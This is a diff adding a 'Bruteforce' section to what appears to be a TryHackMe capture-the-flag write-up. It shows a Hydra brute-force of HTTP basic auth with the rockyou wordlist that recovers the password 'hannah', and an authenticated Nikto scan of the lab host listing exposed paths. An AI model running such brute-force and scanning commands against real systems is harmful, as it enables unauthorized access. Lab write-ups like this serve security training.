@@ -116,4 +116,75 @@ Finished
 
 ## \[Task 2] Bruteforce
 
-john
+<figure><img src=".gitbook/assets/login_8080_joker_hannah.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/burp_joker_password.png" alt=""><figcaption></figcaption></figure>
+
+```sh
+┌──(kali㉿kali)-[~/THM]
+└─$ nikto -h $IP:8080 -id "joker:hannah"
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.56.137
++ Target Hostname:    10.10.56.137
++ Target Port:        8080
++ Start Time:         2024-11-11 16:37:37 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ / - Requires Authentication for realm ' Please enter the password.'
++ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
++ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/bin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/libraries/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 14 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
++ /web.config: Uncommon header 'tcn' found, with contents: choice.
++ /web.config: ASP config file is accessible.
++ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2047
++ /administrator/: This might be interesting.
++ /bin/: This might be interesting.
++ /includes/: This might be interesting.
++ /tmp/: This might be interesting.
++ /README: README file found.
++ /LICENSE.txt: License file found may identify site software.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8897 requests: 0 error(s) and 32 item(s) reported on remote host
++ End Time:           2024-11-11 16:42:57 (GMT1) (320 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                                                                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/THM]
+└─$ 
+
+```
+
+```sh
+┌──(kali㉿kali)-[~/THM]
+└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt $IP -s 8080 http-get
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-11 16:35:13
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://10.10.56.137:8080/
+[8080][http-get] host: 10.10.56.137   login: joker   password: hannah
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-11 16:35:36
+
+```
